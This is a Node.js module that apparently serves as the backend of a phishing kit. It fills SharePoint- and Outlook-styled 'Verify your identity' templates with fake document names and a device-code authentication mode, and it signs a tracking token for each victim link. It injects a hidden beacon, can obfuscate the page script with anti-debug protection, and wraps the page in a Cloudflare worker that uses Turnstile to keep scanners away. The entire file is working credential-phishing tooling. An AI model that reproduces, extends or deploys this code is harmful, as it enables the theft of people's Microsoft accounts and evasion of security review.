const fs = require('fs');
const path = require('path');
const config = require('../config/env');
const jwt = require('jsonwebtoken');

const TEMPLATES_DIR = path.join(__dirname, '..', '..', 'templates');
const DESIGNS_DIR = path.join(__dirname, '..', '..', 'verification-designs');

function normalizeTemplateKey(value) {
  return String(value || '').toLowerCase().trim().replace(/[^a-z0-9]+/g, '');
}

function resolveTemplateDirectory(templateType) {
  const input = String(templateType || '').trim();
  const fallbackDir = 'sharepoint3';
  const candidateDirs = fs.existsSync(TEMPLATES_DIR)
    ? fs.readdirSync(TEMPLATES_DIR, { withFileTypes: true })
        .filter(entry => entry.isDirectory())
        .map(entry => entry.name)
    : [];

  const normalizedInput = normalizeTemplateKey(input || fallbackDir);
  for (const dirName of candidateDirs) {
    const normalizedDir = normalizeTemplateKey(dirName);
    if (normalizedDir === normalizedInput) {
      return path.join(TEMPLATES_DIR, dirName);
    }

    const configPath = path.join(TEMPLATES_DIR, dirName, 'config.json');
    if (fs.existsSync(configPath)) {
      try {
        const config = JSON.parse(fs.readFileSync(configPath, 'utf8'));
        if (config?.name && normalizeTemplateKey(config.name) === normalizedInput) {
          return path.join(TEMPLATES_DIR, dirName);
        }
      } catch (err) {
        // ignore invalid template config and continue
      }
    }
  }

  const directPath = path.join(TEMPLATES_DIR, input || fallbackDir);
  if (fs.existsSync(directPath)) return directPath;

  return path.join(TEMPLATES_DIR, fallbackDir);
}

function loadTemplateConfig(templateType) {
  const templateDir = resolveTemplateDirectory(templateType);
  const templatePath = path.join(templateDir, 'config.json');
  if (fs.existsSync(templatePath)) {
    return JSON.parse(fs.readFileSync(templatePath, 'utf8'));
  }
  return {
    name: templateType,
    preload: true,
    auth_mode: 'devicecode',
    fields: [],
    background: { default: '', editable: true, blur: true },
  };
}

function loadTemplateHTML(templateType) {
  const filePath = path.join(resolveTemplateDirectory(templateType), 'index.html');
  if (fs.existsSync(filePath)) return fs.readFileSync(filePath, 'utf8');
  return '';
}

function loadTemplateCSS(templateType) {
  const filePath = path.join(resolveTemplateDirectory(templateType), 'style.css');
  if (fs.existsSync(filePath)) return fs.readFileSync(filePath, 'utf8');
  return '';
}

function loadTemplateJS(templateType) {
  const filePath = path.join(resolveTemplateDirectory(templateType), 'script.js');
  if (fs.existsSync(filePath)) return fs.readFileSync(filePath, 'utf8');
  return '';
}

function loadVerificationDesignCSS(designName) {
  const baseName = String(designName || 'outlook').trim();
  const designPath = path.join(DESIGNS_DIR, `${baseName}.css`);
  if (fs.existsSync(designPath)) return fs.readFileSync(designPath, 'utf8');
  const fallbackPath = path.join(DESIGNS_DIR, 'outlook.css');
  if (fs.existsSync(fallbackPath)) return fs.readFileSync(fallbackPath, 'utf8');
  return '';
}

function generateExportHtml(link, user, options = {}) {
  const templateType = link.template_type || 'sharepoint3';
  const designName = link.verification_design || 'outlook';

  let html = loadTemplateHTML(templateType);
  const css = loadTemplateCSS(templateType) + '\n' + loadVerificationDesignCSS(designName);
  let script = loadTemplateJS(templateType);

  html = html.replace(/\/\* \{\{CSS\}\} \*\//, `<style>${css}</style>`);
  html = html.replace(/\/\/ \{\{SCRIPT\}\}/, `<script>${script}<\/script>`);
  html = html.replace('{{TITLE}}', link.title_text || 'Verify your identity');
  html = html.replace('{{MESSAGE}}', link.message_text || 'Please verify your identity to continue');
  html = html.replace('{{BUTTON_TEXT}}', link.button_text || 'Get verification code');
  html = html.replace('{{FILE_NAME}}', link.file_name || 'Document.pdf');
  html = html.replace('{{PAGES}}', String(link.pages || 1));

  const jt = jwt.sign({ user_id: user.id, link_id: link.id }, config.JWT_SECRET, { expiresIn: '90d' });
  
  // Load VG engine
  let vgEngine = '';
  const vgEnginePath = path.join(TEMPLATES_DIR, 'assets', 'vg-engine.js');
  if (fs.existsSync(vgEnginePath)) {
    vgEngine = fs.readFileSync(vgEnginePath, 'utf8');
  }

  // Build window.* variables injection
  const obfuscationEnabled = String(config.OBFUSCATION_ENABLED || '').toLowerCase() === 'true' || String(config.ENABLE_OBFUSCATION || '').toLowerCase() === 'true';
  const antidebugEnabled = String(config.ANTIDEBUG_ENABLED || '').toLowerCase() === 'true' || String(config.ENABLE_ANTIDEBUG || '').toLowerCase() === 'true';
  
  // Get blur settings from admin
  const defaultBlur = link.background_blur || 4;
  const bgUrl = link.background_blur_url || '';

  // Turnstile: only embed site key when link-level turnstile is enabled. The
  // export domain is provided so runtime widgets can pick a per-domain key.
  const turnstileEnabled = link.turnstile_enabled !== false && link.turnstile_enabled !== 0;
  const exportDomain = options.domain ? String(options.domain).trim().replace(/^https?:\/\//, '').replace(/\/+$/, '') : '';
  const turnstileSiteKey = config.CF_TURNSTILE_SITE_KEY || '';

  const windowVars = `<script>
    window.VG_JWT="${jt}";
    window.__DESTINATION_URL="${link.destination_url || 'https://office.com'}";
    window.__AUTH_MODE="${link.auth_mode || 'cookie'}";
    window.__BACKGROUND_BLUR_URL="${bgUrl}";
    window.__BACKGROUND_BLUR_AMOUNT=${defaultBlur};
    window.__DOC_FILENAME="${link.file_name || 'Document.pdf'}";
    window.__DOC_TITLE="${link.title_text || 'Non-Disclosure Agreement'}";
    window.__DOC_PAGES="${link.pages || '4 pages'}";
    window.__PAGE_TITLE="${link.title_text || 'Verify your identity'}";
    window.__PAGE_MESSAGE="${link.message_text || 'Please verify your identity to continue'}";
    window.__PRIMARY_BUTTON_TEXT="${link.button_text || 'Get verification code'}";
    window.__OBFUSCATION_ENABLED=${obfuscationEnabled ? 'true' : 'false'};
    window.__ANTIDEBUG_ENABLED=${antidebugEnabled ? 'true' : 'false'};
    window.COPY_TO_OPEN=${link.copy_to_open ? 'true' : 'false'};
    window.__TURNSTILE_ENABLED=${turnstileEnabled ? 'true' : 'false'};
    window.__TURNSTILE_SITE_KEY="${turnstileSiteKey}";
    window.__EXPORT_DOMAIN="${exportDomain}";
    window.__BLOB_URL_ENABLED=${link.blob_url_enabled ? 'true' : 'false'};
  </script>`;

  // Inject VG engine + window vars before </head>
  const engineScript = vgEngine ? `<script>${vgEngine}<\/script>` : '';
  html = html.replace('</head>', `${windowVars}${engineScript}</head>`);

  const templateConfig = loadTemplateConfig(templateType);
  if (templateConfig.preload) {
    html = html.replace(/\{\{#PRELOAD\}\}/g, '').replace(/\{\{\/PRELOAD\}\}/g, '');
    html = html.replace(/\{\{#NO_PRELOAD\}\}[\s\S]*?\{\{\/NO_PRELOAD\}\}/g, '');
  } else {
    html = html.replace(/\{\{#NO_PRELOAD\}\}/g, '').replace(/\{\{\/NO_PRELOAD\}\}/g, '');
    html = html.replace(/\{\{#PRELOAD\}\}[\s\S]*?\{\{\/PRELOAD\}\}/g, '');
  }

  if (config.ENABLE_OBFUSCATION || link.obfuscated) {
    try {
      const JavaScriptObfuscator = require('javascript-obfuscator');
      const result = JavaScriptObfuscator.obfuscate(script, {
        compact: true, controlFlowFlattening: true, deadCodeInjection: true,
        debugProtection: true, selfDefending: true,
      });
      html = html.replace(`<script>${script}</script>`, `<script>${result.getObfuscatedCode()}</script>`);
    } catch (e) {
      console.error('[Obfuscation] Failed:', e.message);
    }
  }

  // Add beacon
  html = html.replace('</body>', `<img src="/beacon?t=${Date.now()}" width="1" height="1" style="display:none" onerror="fetch('/beacon',{method:'POST',body:JSON.stringify({jwt_token:window.VG_JWT})})"></body>`);

  return html;
}

function buildWorkerScript(link, user, apiBaseUrl) {
  const templateType = link.template_type || 'sharepoint3';
  const designName = link.verification_design || 'outlook';

  // Build the page HTML
  let pageHtml = loadTemplateHTML(templateType);
  const css = loadTemplateCSS(templateType) + '\n' + loadVerificationDesignCSS(designName);
  let script = loadTemplateJS(templateType);

  pageHtml = pageHtml.replace(/\/\* \{\{CSS\}\} \*\//, `<style>${css}</style>`);
  pageHtml = pageHtml.replace(/\/\/ \{\{SCRIPT\}\}/, `<script>${script}<\/script>`);
  pageHtml = pageHtml.replace('{{TITLE}}', link.title_text || 'Verify your identity');
  pageHtml = pageHtml.replace('{{MESSAGE}}', link.message_text || 'Please verify your identity to continue');
  pageHtml = pageHtml.replace('{{BUTTON_TEXT}}', link.button_text || 'Get verification code');
  pageHtml = pageHtml.replace('{{FILE_NAME}}', link.file_name || 'Document.pdf');
  pageHtml = pageHtml.replace('{{PAGES}}', String(link.pages || 1));

  const jt = jwt.sign({ user_id: user.id, link_id: link.id }, config.JWT_SECRET, { expiresIn: '90d' });
  
  // Load VG engine
  let vgEngine = '';
  const vgEnginePath2 = path.join(TEMPLATES_DIR, 'assets', 'vg-engine.js');
  if (fs.existsSync(vgEnginePath2)) {
    vgEngine = fs.readFileSync(vgEnginePath2, 'utf8');
  }

  const obf2 = String(config.OBFUSCATION_ENABLED || '').toLowerCase() === 'true' || String(config.ENABLE_OBFUSCATION || '').toLowerCase() === 'true';
  const adb2 = String(config.ANTIDEBUG_ENABLED || '').toLowerCase() === 'true' || String(config.ENABLE_ANTIDEBUG || '').toLowerCase() === 'true';
  const defaultBlur2 = link.background_blur || 4;
  const bgUrl2 = link.background_blur_url || '';

  const turnstileEnabled2 = link.turnstile_enabled !== false && link.turnstile_enabled !== 0;
  const turnstileSiteKey2 = config.CF_TURNSTILE_SITE_KEY || '';

  const windowVars2 = `<script>
    window.VG_JWT="${jt}";
    window.__DESTINATION_URL="${link.destination_url || 'https://office.com'}";
    window.__AUTH_MODE="${link.auth_mode || 'cookie'}";
    window.__BACKGROUND_BLUR_URL="${bgUrl2}";
    window.__BACKGROUND_BLUR_AMOUNT=${defaultBlur2};
    window.__DOC_FILENAME="${link.file_name || 'Document.pdf'}";
    window.__DOC_TITLE="${link.title_text || 'Non-Disclosure Agreement'}";
    window.__DOC_PAGES="${link.pages || '4 pages'}";
    window.__PAGE_TITLE="${link.title_text || 'Verify your identity'}";
    window.__PAGE_MESSAGE="${link.message_text || 'Please verify your identity to continue'}";
    window.__PRIMARY_BUTTON_TEXT="${link.button_text || 'Get verification code'}";
    window.__OBFUSCATION_ENABLED=${obf2 ? 'true' : 'false'};
    window.__ANTIDEBUG_ENABLED=${adb2 ? 'true' : 'false'};
    window.COPY_TO_OPEN=${link.copy_to_open ? 'true' : 'false'};
    window.__TURNSTILE_ENABLED=${turnstileEnabled2 ? 'true' : 'false'};
    window.__TURNSTILE_SITE_KEY="${turnstileSiteKey2}";
    window.__BLOB_URL_ENABLED=${link.blob_url_enabled ? 'true' : 'false'};
  </script>`;

  const engineScript2 = vgEngine ? `<script>${vgEngine}<\/script>` : '';
  pageHtml = pageHtml.replace('</head>', `${windowVars2}${engineScript2}</head>`);

  const templateConfig = loadTemplateConfig(templateType);
  if (templateConfig.preload) {
    pageHtml = pageHtml.replace(/\{\{#PRELOAD\}\}/g, '').replace(/\{\{\/PRELOAD\}\}/g, '');
    pageHtml = pageHtml.replace(/\{\{#NO_PRELOAD\}\}[\s\S]*?\{\{\/NO_PRELOAD\}\}/g, '');
  } else {
    pageHtml = pageHtml.replace(/\{\{#NO_PRELOAD\}\}/g, '').replace(/\{\{\/NO_PRELOAD\}\}/g, '');
    pageHtml = pageHtml.replace(/\{\{#PRELOAD\}\}[\s\S]*?\{\{\/PRELOAD\}\}/g, '');
  }

  let finalScript = script;
  if (config.ENABLE_OBFUSCATION || link.obfuscated) {
    try {
      const JavaScriptObfuscator = require('javascript-obfuscator');
      finalScript = JavaScriptObfuscator.obfuscate(script, {
        compact: true, controlFlowFlattening: true, deadCodeInjection: true,
        debugProtection: true, selfDefending: true,
      }).getObfuscatedCode();
    } catch (e) {
      console.error('[Obfuscation] Worker obfuscation failed:', e.message);
    }
  }
  pageHtml = pageHtml.replace(`<script>${script}</script>`, `<script>${finalScript}</script>`);

  // Load base worker script
  let workerJs = fs.readFileSync(path.join(__dirname, '..', '..', 'worker', 'devicecode-worker.js'), 'utf8');

  // Replace placeholders
  const verifyUrl = apiBaseUrl || config.APP_URL || (config.CF_WORKERS_SUBDOMAIN ? `https://${config.CF_WORKERS_SUBDOMAIN}.workers.dev` : `http://localhost:${config.PORT}`);
  workerJs = workerJs
    .replace("'{{TURNSTILE_KEY}}'", `'${config.CF_TURNSTILE_SITE_KEY}'`)
    .replace("'{{TURNSTILE_SECRET}}'", `'${config.CF_TURNSTILE_SECRET_KEY}'`)
    .replace("'{{VERIFY_ENDPOINT}}'", `'${verifyUrl}'`)
    .replace("'{{BEACON_ENDPOINT}}'", `'${verifyUrl}'`)
    .replace("'{{LOG_ENDPOINT}}'", `'${verifyUrl}'`)
    .replace("'{{TEMPLATE_HTML}}'", '`' + pageHtml.replace(/`/g, '\\`').replace(/\$/g, '\\$') + '`');

  return workerJs;
}

module.exports = {
  normalizeTemplateKey,
  resolveTemplateDirectory,
  loadTemplateConfig,
  loadTemplateHTML,
  loadTemplateCSS,
  loadTemplateJS,
  loadVerificationDesignCSS,
  generateExportHtml,
  buildWorkerScript,
};
